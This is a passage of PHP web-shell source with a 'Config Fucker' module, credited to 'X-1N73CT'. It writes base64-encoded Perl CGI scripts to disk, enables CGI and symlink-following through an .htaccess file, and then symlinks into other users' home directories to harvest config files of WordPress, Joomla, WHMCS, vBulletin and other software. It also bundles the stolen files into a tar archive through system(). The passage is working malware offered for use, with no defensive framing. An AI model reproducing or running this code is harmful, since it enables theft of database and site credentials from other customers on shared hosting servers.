IDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlBocEJCLWZvcnVtLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3Muc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG0uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5tYW5nZXdobWNzLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2Uuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2VzLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLXNob3BwaW5nLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyMi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d3AxMy1wcmVzcy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd2ViLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ibG9ncy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1wcm90YWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+b3JkcHJlc3Mtc2l0ZS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtdGVzdC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3Muc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3Quc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3Rpbmcuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy5zaHRtbCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLnNodG1sJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLnNodG1sJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy5zaHRtbCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnNodG1sJyk7DQp9DQppZiAoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAnUE9TVCcpIHsNCiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9IGVsc2Ugew0KICAkYnVmZmVyID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQpAcGFpcnMgPSBzcGxpdCgvJi8sICRidWZmZXIpOw0KZm9yZWFjaCAkcGFpciAoQHBhaXJzKSB7DQogICgkbmFtZSwgJHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOw0KICAkbmFtZSA9fiB0ci8rLyAvOw0KICAkbmFtZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkdmFsdWUgPX4gdHIvKy8gLzsNCiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICRGT1JNeyRuYW1lfSA9ICR2YWx1ZTsNCn0NCmlmICgkRk9STXtwYXNzfSBlcSAiIil7DQpwcmludCAnDQo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPkNvbmZpZyBGdWNrZXI8L3A+DQo8cD48Zm9udCBjb2xvcj0iI0MwQzBDMCI+WzwvZm9udD4gQ29kZWQgQnkgPGZvbnQgY29sb3I9IiNGRjAwMDAiPlgtMU43M0NUPC9mb250Pjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250Pg0KPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCjx0ZXh0YXJlYSBuYW1lPSJwYXNzIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwZmYwMDsgd2lkdGg6IDU0M3B4OyBoZWlnaHQ6IDQyMHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEM7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjhwdDsgY29sb3I6I0ZGMDAwMCIgID48L3RleHRhcmVhPjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPg0KPGlucHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICNGRjAwMDA7IHdpZHRoOiAyMTJweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiNGRjAwMDA7ICIgIC8+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+DQo8aW5wdXQgbmFtZT0iU3VibWl0MSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR0VUIENPTkZJRyAhIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgI0ZGMDAwMDsgd2lkdGg6IDk5OyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjojNTlFODE3OyB0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7IGhlaWdodDoyMzsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDIiAvPjwvcD4NCjwvZm9ybT4nOw0KfWVsc2V7DQpAbGluZXMgPTwkRk9STXtwYXNzfT47DQokeSA9IEBsaW5lczsNCm9wZW4gKE1ZRklMRSwgIj50YXIudG1wIik7DQpwcmludCBNWUZJTEUgInRhciAtY3pmICIuJEZPUk17dGFyfS4iLnRhciAiOw0KZm9yICgka2E9MDska2E8JHk7JGthKyspew0Kd2hpbGUoQGxpbmVzWyRrYV0gID1+IG0vKC4qPyk6eDovZyl7DQombGlsKCQxKTsNCnByaW50IE1ZRklMRSAkMS4iLnR4dCAiOw0KZm9yKCRrZD0xOyRrZDwxODska2QrKyl7DQpwcmludCBNWUZJTEUgJDEuJGtkLiIudHh0ICI7DQp9DQp9DQogfQ0KcHJpbnQnPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+DQo8cD5Zb3UgZ290IGl0ISE8YnI+PGJyPjxicj48Zm9udCBjb2xvcj0iI0MwQzBDMCI+WzwvZm9udD4gQ29kZWQgQnkgPGZvbnQgY29sb3I9IiNGRjAwMDAiPlgtMU43M0NUPC9mb250Pjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250PjwvcD4NCjxwPiZuYnNwOzwvcD4nOw0KaWYoJEZPUk17dGFyfSBuZSAiIil7DQpvcGVuKElORk8sICJ0YXIudG1wIik7DQpAbGluZXMgPTxJTkZPPiA7DQpjbG9zZShJTkZPKTsNCnN5c3RlbShAbGluZXMpOw0KcHJpbnQnPHA+PGEgaHJlZj0iJy4kRk9STXt0YXJ9LicudGFyIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+DQo8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lIj5DbGljayBIZXJlIFRvIERvd25sb2FkIFRhciBGaWxlPC9zcGFuPjwvZm9udD48L2E+PC9wPic7DQp9DQp9DQogcHJpbnQiDQo8L2JvZHk+DQo8L2h0bWw+Ijs=';
		$file = fopen("lcf.pl","w+");
		$write = fwrite ($file ,base64_decode($lcf));
	fclose($file);
	
	chmod("lcf.pl",0755);
	echo "<iframe src=LCF/lcf.pl width=97% height=100% frameborder=0></iframe>
   </div>";
} 
#==================[ Multi BConfig Fucker ]==================#

if(isset($_POST['perlconfig']))
{
echo "<center/><b><font color=>+--==[ Perl Config Fucker Priv8 ]==--+</font></b><br><br>";
  mkdir('MCF_config', 0755);
    chdir('MCF_config');
	 $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Error mas broo!!!");
        $metin = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);

$configshell = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5Db25maWcgRnVja2VyIEJ5IFgtMW43M2N0PC90aXRsZT4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3BuZy0zLmZpbmRpY29ucy5jb20vZmlsZXMvaWNvbnMvMTkzNS9yZWRfZ2Vtc192b2xfMi8xMjgvcjJfZHJhZ29uLnBuZyIvPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KCWJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQoNCn0NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiBUYWhvbWE7DQogZm9udC1zaXplOiB4LXNtYWxsOw0KIGZvbnQtd2VpZ2h0OiBib2xkOw0KIGNvbG9yOiAjMDBmZjAwOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQokZG9tYWluPSRtc3IuIi8iLiR1c2VyOw0KJGRvbWFpbj1+cy9cbi8vZzsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS50eHQnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIudHh